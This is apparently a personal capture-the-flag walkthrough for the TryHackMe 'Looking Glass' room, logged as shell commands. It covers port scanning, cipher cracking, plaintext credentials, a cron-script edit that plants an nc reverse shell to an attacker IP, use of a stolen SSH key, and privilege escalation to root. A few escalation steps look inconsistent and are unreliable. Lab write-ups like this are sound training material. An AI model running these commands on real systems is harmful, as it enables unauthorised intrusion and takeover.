# CTF

cd @@CS/area-51/CTF_THM_LookingGlass
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html -o gobuster.log
# attempted seeking several pages, but no luck
sudo nmap -sS -sV -sC -p- -T4 -oN nmap/initial
sudo nmap -sV -sC $TARGET -o nmap_sC_sV.log
sudo nmap -sV -sC $TARGET -o nmap_sC_sV.log
sudo nmap -p- $TARGET -o nmap_full.log
# found port 22 open and `ssh` Dropbear sshd services open at ports [9000,14000)
# applied binary search over [9000,14000) to find the port 9237 open(on different instances of $TARGET restart the port is different)
ssh test@$TARGET -p $PORT
# Found a poem with a hint to find the flag in the home directory
# Found cipher-text in the poem and used : Vigenere cipher was used https://dcode.fr/cipher-identifier | https://www.boxentriq.com/code-breaking/cipher-identifier
# Key::`thealphabetcipher` :: Used key-len 20 https://www.boxentriq.com/code-breaking/vigenere-cipher
# Used key to find plaintext! https://www.dcode.fr/vigenere-cipher
# Plaintext contained the secret : `jabberwock:OccasionPolitelyArrangeTrembling`
# Used the secret to login to the ssh server ------------
ls -al
# Found a file `user.txt` with the flag
sudo -l
# Allowed to execute `/sbin/reboot` as root
cat /etc/crontab
cat /etc/cron.d/*
cat /etc/passwd
cat /etc/sudoers
cd /home && ls -al
# Found a user `tweedledum` with a home directory `/home/jabberwock`
# Found a cronjob running AT restart : `@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
# modding the file to get a reverse shell
nano /home/jabberwock/twasBrillig.sh
# modified the poem as well to play around with the `wall` command
$ wall $(cat /home/jabberwock/poem_copy.txt)
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.8.121.250 1274 >/tmp/f
# got a reverse shell
sudo /sbin/reboot
# ----------------------------------------------
# before it started started nc on ATK machine
nc -lvnp 1274
# got a reverse shell ----------------------------------------------
ls -al
whoami # am `tweedledum`
python3 -c 'import pty;pty.spawn("/bin/bash")'
cat humptydumpty.txt
# found the file with hashes and password to the user `humptydumpty` @https://hashes.com/en/decrypt/hash
# password : `zyxwvutsrqponmlk`
su humptydumpty
wget "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"
chmod +x LinEnum.sh
./LinEnum.sh
# also performed enumeration manually and with `linpeas.sh`
# found that /home/alice/.ssh/id_rsa is readable by `humptydumpty`
# used it to login to `alice` account
ssh alice@localhost -i /home/humptydumpty/.ssh/id_rsa
ls -al
sudo -l
id
# navigated around and found nth for `alice` user
# performed enumeration

wget "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"
chmod +x LinEnum.sh
./LinEnum.sh

# found that `ssalg-gnikool` has `suid` bit set
# found that `ssalg-gnikool` is a binary that can be used to read files
sudo -u ssalg-gnikool /bin/bash
# got a root shell
# ----------------------------------------------
cd /root
cat root.txt
# found the flag
